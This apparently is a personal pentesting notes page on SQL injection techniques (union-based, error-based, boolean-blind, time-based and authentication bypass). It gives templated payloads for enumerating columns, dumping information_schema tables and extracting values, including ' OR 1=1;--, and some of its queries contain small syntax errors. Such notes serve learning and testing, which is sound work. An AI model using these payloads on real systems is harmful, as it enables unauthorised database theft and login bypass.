---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SQL Injection

## <mark style="color:blue;">In-Band</mark>&#x20;

Refers to the same method of communication being used to exploit the vulnerability and also receive the results.



## <mark style="color:blue;">Out Of Band</mark>

Depends on DB feature of making some kind of external network call based on the results from an SQL query. Is classified by having two different communication channels:&#x20;

* One to launch the attack  where SQLi is made to send a query.
* Other to gather the results intercepting response from a DB.



## <mark style="color:blue;">Error-Based</mark>

Obtaining information about the database structure as error messages from the database are printed directly to the browser screen.



## <mark style="color:blue;">Union-Based</mark>

Use SQL UNION operator to return additional results to the page, letting the extraction of large amounts of data.

### Case 1

* Determinating number of colums

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$value UNION SELECT 1
$url/query?$column=$value UNION SELECT 1,2   #Try with a extra value
$url/query?$column=$value UNION SELECT 1,2,3 #Try Until theres no message error
#This won't shows message error when number of columns coincide  
```
{% endcode %}

***

* Change query value

<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue UNION SELECT $found
</strong><strong>#Change until no results are shown to determine value
</strong></code></pre>

{% hint style="info" %}
`$found` is the union value that have been caught in previous step
{% endhint %}

***

* Check database name

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue UNION $found,database() #Try to get database
#This will return the name of DB we are searching
```
{% endcode %}

***

* Check information schema for DB and tables information

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue UNION $found,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '$dbfound'
#This will return a string with all tables of the database
```
{% endcode %}

{% hint style="info" %}
`$dbfound`is the result of previuos query
{% endhint %}

***

* Check information schema for DB and tables information

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue UNION $found,group_concat(colum_name) FROM information_schema.columns WHERE table_name = '$tablefound'
#This will return a string with all colums of the table
```
{% endcode %}

***

* Obtain the values that we were looking for

{% code overflow="wrap" lineNumbers="true" %}
```sql
0 UNION SELECT 1,2,group_concat($value1,$value2) FROM $tablefound
#Obtain values from the table we needed
```
{% endcode %}

***

### Case 2

* Check if  vulnerable by sending a malformed petition with '

{% code overflow="wrap" lineNumbers="true" %}
```sql
"GET /about/2' HTTP/1.1"
#We obtain a 500 error and this code
<code>SELECT firstName, lastName, pfpLink, role, bio FROM $tablename WHERE id = 2'</code>
```
{% endcode %}

***

* As we know the number of columns, we make union to select the _column\_name_ parameter and leave the other columns as null for avoiding error. Then we obtain info from the default db _information\_schema_ and select the _column_ parameter specifying the name of the table we need

{% code overflow="wrap" lineNumbers="true" %}
```sql
#Make the petition to an unvalid value (-1) for avoiding displaying an entry of the database instead of the column name
/about/-1 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name='$tablename'

 About | id None #The result obtained in the response
```
{% endcode %}

***

* Use _group\_concat()_ to get all columns

{% code overflow="wrap" lineNumbers="true" %}
```sql
/about/-1 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name='$tablename'

About | id,firstName,lastName,pfpLink,role,shortRole,bio,$columname None #The result obtained in the response
```
{% endcode %}

***

* Obtain required information from the table

{% code overflow="wrap" lineNumbers="true" %}
```sql
/about/-1 UNION ALL SELECT $columname,null,null,null,null FROM $tablename WHERE id = 1
#The response is the information tha we were looking for
```
{% endcode %}

***



## <mark style="color:blue;">Blind</mark>

Results of the attack can't directly be seen on the screen,we get little to no feedback to confirm whether our injected queries were.



## <mark style="color:blue;">Autenthication Bypass</mark>

Method consisting in consider that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table.

* We asumme the DB use tipical query for authentication

{% code overflow="wrap" lineNumbers="true" %}
```sql
SELECT * from users WHERE username='%username%' and password='%password%' LIMIT 1;
```
{% endcode %}

***

* Make an insertion in password field

{% code overflow="wrap" lineNumbers="true" %}
```sql
' OR 1=1;--   #Use this comparison to cheat on verification
```
{% endcode %}

***



## <mark style="color:blue;">Boolean Based</mark>

Use the response we receive back from our injection if this only have two outcomes

* Check if page has verification queries

<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/$query?$column=$value
</strong></code></pre>

***

* Use union injection until the state change

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION SELECT 1;
$url/query?$column=$changedvalue' UNION SELECT 1,2;   #Try with a extra value
$url/query?$column=$changedvalue' UNION SELECT 1,2,3; #Try Until the result change
#This will determinate the number of colums
```
{% endcode %}

***

* Find database name by iteration

<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue' UNION SELECT $found where database() like '%';
</strong>#The value % will match anything true
$url/query?$column=$changedvalue' UNION SELECT $found where database() like 'a%'; #Try a
$url/query?$column=$changedvalue' UNION SELECT $found where database() like 'b%'; #Try b
#Repeat with every letter until found a value that gets true
$url/query?$column=$changedvalue' UNION SELECT $found where database() like '$lettera%';
#Make the same process for the next value
$url/query?$column=$changedvalue' UNION SELECT $found where database() LIKE '$letter$letter2a$%';
#Repeat until found all DB name
</code></pre>

{% hint style="info" %}
`$found` is the union value that have been caught in previous step

`$letter` is the value that return true in each iteration
{% endhint %}

***

* Find Table name by iteration

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WHERE table_schema = '$dbfound' and table_name LIKE 'a%';
#Repeat until found all table name
```
{% endcode %}

***

* Find column by iteration

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WHERE table_schema = '$dbfound' and table_name = 'table' and column_name LIKE 'a%';
#Make iterative process to find column name
```
{% endcode %}

***

* Find objective value

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' FROM $table_found WHERE %column_found LIKE 'a%';
#Make iterative process to find value needed
```
{% endcode %}

***

* &#x20;Handle of value exceptions

{% hint style="warning" %}
If in any point of iteration you found a value that you don't need to get you must exclude it to restringe your injection
{% endhint %}

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WHERE table_schema = '$dbfound' and and tablename != $notobjective and $table_name LIKE 'a%';
```
{% endcode %}

{% hint style="info" %}
`$notobjective`refers to the value that we found but we don't need
{% endhint %}

***



## <mark style="color:blue;">Time Based</mark>

Make use of time a response is generated to the request to determinate if query value was found or not. It is used when we don't get a visual return to the injection.

* Determinating number of colums

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time);
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time),2;
#Try until the petition time is different
```
{% endcode %}

{% hint style="info" %}
The time of a error request is always less than a correct query
{% endhint %}

***

* Make Boolean based iterative process to map DB,tables and columns you need

{% code overflow="wrap" lineNumbers="true" %}
```sql
#Find DB name, table, column by iterative process using sleep
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM information_schema.tables WHERE table_schema = '$dbfound' and table_name = 'table' and column_name LIKE '%';
#The values of each step are dicted by the time the response is sent
```
{% endcode %}

***

* Make Boolean based iterative process to find the value you need

{% code overflow="wrap" lineNumbers="true" %}
```sql
#Find DB name, table, column by iterative process using sleep
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM $table_found WHERE $column_found 
```
{% endcode %}

***

